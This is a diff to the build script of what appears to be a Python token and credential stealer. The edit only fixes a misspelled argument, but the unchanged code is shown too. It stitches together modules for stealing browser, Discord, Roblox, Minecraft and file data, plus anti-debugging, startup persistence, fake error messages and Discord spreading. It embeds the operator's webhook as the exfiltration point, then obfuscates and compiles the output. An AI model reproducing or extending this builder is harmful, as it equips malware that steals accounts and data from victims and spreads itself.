@@ -43,86 +43,86 @@ class Builder:
         self.FILE = open(f"{name}.py","w+")
         self.FILE.write(open("utils/Imports.py","r").read()+"\n")
         if webhookJ:
-            embed.add_embed_field(name=f"Webhook Junk : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Webhook Junk : ", value=f":white_check_mark:")
             self.FILE.write(self._webhooksJUNK(False))
         else:
-            embed.add_embed_field(name=f"Webhook Junk : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Webhook Junk : ", value=f":x:")
         self.FILE.write(f"wbh = '{wbh}'\n")
         if webhookJ:
             self.FILE.write(self._webhooksJUNK(True)+"\n")
         self.FILE.write("dtokens = []\n")
         if browserR:
-            embed.add_embed_field(name=f"Browser Recovery : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Browser Recovery : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/Browser.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Browser Recovery : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Browser Recovery : ", value=f":x:")
             self.FILE.write("class Browsers():\n\tpass\n")
         if discordR:
-            embed.add_embed_field(name=f"Discord Recovery : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Discord Recovery : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/Discord.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Discord Recovery : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Discord Recovery : ", value=f":x:")
             self.FILE.write("class DISCORD:\n\tpass\n")
         if robloxR:
-            embed.add_embed_field(name=f"Roblox Recovery : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Roblox Recovery : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/Roblox.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Roblox Recovery : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Roblox Recovery : ", value=f":x:")
             self.FILE.write("class Roblox:\n\tpass\n")
         if filesR:
-            embed.add_embed_field(name=f"Files Recovery : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Files Recovery : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/Files.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Files Recovery : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Files Recovery : ", value=f":x:")
             self.FILE.write("class Files:\n\tpass\n")
         if minecraftR:
-            embed.add_embed_field(name=f"Minecraft Recovery : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Minecraft Recovery : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/Minecraft.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Minecraft Recovery : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Minecraft Recovery : ", value=f":x:")
             self.FILE.write("class Minecraft:\n\tpass\n")
         if networkI:
-            embed.add_embed_field(name=f"Network Info : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Network Info : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/Network.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Network Info : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Network Info : ", value=f":x:")
             self.FILE.write("class Network:\n\tpass\n")
         if antiD:
-            embed.add_embed_field(name=f"Anti Debug : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Anti Debug : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/AntiDebug.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Anti Debug : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Anti Debug : ", value=f":x:")
             self.FILE.write("class Antidebug:\n\tpass\n")
         if rebootP:
-            embed.add_embed_field(name=f"Reboot : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Reboot : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/Reboot.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Reboot : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Reboot : ", value=f":x:")
             self.FILE.write("class Reboot:\n\tpass\n")
         if startupP:
-            embed.add_embed_field(name=f"Startup : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Startup : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/Startup.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Startup : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Startup : ", value=f":x:")
             self.FILE.write("class Startup:\n\tpass\n")
         if errorM:
-            embed.add_embed_field(name=f"Error Message : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Error Message : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/ErrorMSG.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Error Message : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Error Message : ", value=f":x:")
             self.FILE.write("class ErrorMsg:\n\tpass\n")
         if discordS:
-            embed.add_embed_field(name=f"Discord Spreading : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Discord Spreading : ", value=f":white_check_mark:")
             self.FILE.write(open("utils/DiscordSpreading.py",'r').read()+"\n")
         else:
-            embed.add_embed_field(name=f"Discord Spreading : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Discord Spreading : ", value=f":x:")
             self.FILE.write("class Spread:\n\tpass\n")
         Maincode = open("utils/Main.py",'r').read()
         if pingH:
-            embed.add_embed_field(name=f"Ping : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Ping : ", value=f":white_check_mark:")
             Maincode = Maincode.replace("jtjirjihirthr = False","jtjirjihirthr = True")
         else:
-            embed.add_embed_field(name=f"Ping : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Ping : ", value=f":x:")
         self.FILE.write(Maincode+"\n")
         self.FILE.write("""
 def main():
@@ -142,10 +142,10 @@ main()
 """)
         self.FILE.close()
         if obfuscateS:
-            embed.add_embed_field(name=f"Obfuscate : ", value=f":white_check_mark:", ineline=False)
+            embed.add_embed_field(name=f"Obfuscate : ", value=f":white_check_mark:")
             self._Obfuscation(name)
         else:
-            embed.add_embed_field(name=f"Obfuscate : ", value=f":x:", ineline=False)
+            embed.add_embed_field(name=f"Obfuscate : ", value=f":x:")
         self._Compile(icon = icon, name = name)
         webhook.add_embed(embed)
         webhook.execute()
